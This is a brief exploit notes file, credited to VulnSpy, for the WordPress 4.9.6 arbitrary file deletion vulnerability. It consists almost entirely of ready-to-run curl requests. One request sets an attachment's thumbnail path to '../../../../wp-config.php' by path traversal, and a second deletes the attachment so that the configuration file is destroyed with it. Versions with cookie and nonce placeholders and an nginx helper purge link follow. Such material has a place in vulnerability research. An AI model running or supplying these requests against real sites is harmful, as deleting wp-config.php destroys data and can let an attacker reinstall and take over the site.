// by VulnSpy http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/

//1. EDITTOINSERT
curl -v 'http://localhost/wp-admin/upload.php?item=1' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php'

//ACTION
curl -v 'http://localhost/wp-admin/upload.php?item=1' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***'

//1. realexample
curl -v 'http://localhost/wp-admin/upload.php?item=1' -H 'Cookie: wordpress_????; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_????; wp-settings-time-1=????; wp-settings-1=????' -d 'action=editattachment&_wpnonce=?????&thumb=../../../../wp-config.php'

//2. realexample
curl -v 'http://localhost/wp-admin/upload.php?item=1' -H 'Cookie: wordpress_????; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_????; wp-settings-time-1=????; wp-settings-1=????' -d 'action=delete&_wpnonce=????'


//InspectElement EditMedia
<a class="ab-item" href="/wp-admin/upload.php?nginx_helper_action=purge&amp;nginx_helper_urls=all&amp;_wpnonce=????????" title="x">x</a>